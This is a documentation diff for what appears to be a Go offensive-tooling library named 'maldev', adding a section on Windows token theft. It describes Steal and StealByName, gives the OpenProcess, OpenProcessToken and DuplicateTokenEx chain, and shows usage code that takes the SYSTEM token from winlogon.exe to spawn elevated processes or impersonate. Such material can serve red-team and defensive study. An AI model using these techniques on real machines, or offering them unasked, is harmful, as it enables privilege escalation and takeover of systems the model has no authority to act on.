@@ -210,6 +210,53 @@ for _, p := range privs {
 }
 ```
 
+### Token Theft -- Steal and StealByName
+
+#### `Steal(pid int) (*Token, error)`
+
+**Purpose:** Duplicates the primary token from a target process. This is the standard post-exploitation token theft chain: open the process, query its token, duplicate it as a primary token.
+
+**Parameters:**
+- `pid` (int) -- Target process ID.
+
+**Requires:** `SeDebugPrivilege` for SYSTEM-level processes.
+
+**How it works:**
+1. `OpenProcess` with `PROCESS_QUERY_INFORMATION`.
+2. `OpenProcessToken` with `TOKEN_DUPLICATE | TOKEN_QUERY`.
+3. `DuplicateTokenEx` as `SecurityImpersonation` / `TokenPrimary`.
+
+```go
+import "github.com/oioio-space/maldev/win/token"
+
+tok, err := token.Steal(targetPID)
+if err != nil {
+    log.Fatal(err)
+}
+defer tok.Close()
+
+level, _ := tok.IntegrityLevel() // "System" if stolen from a SYSTEM process
+```
+
+#### `StealByName(processName string) (*Token, error)`
+
+**Purpose:** Finds the first process matching the given name and steals its token. Convenience wrapper around `Steal`.
+
+**Parameters:**
+- `processName` (string) -- Process name to search for (e.g., `"winlogon.exe"`).
+
+```go
+import "github.com/oioio-space/maldev/win/token"
+
+// Steal SYSTEM token from winlogon.exe
+tok, err := token.StealByName("winlogon.exe")
+if err != nil {
+    log.Fatal(err)
+}
+defer tok.Close()
+// Now use tok to create elevated processes or impersonate
+```
+
 ---
 
 ## win/privilege -- Admin Detection and Elevation
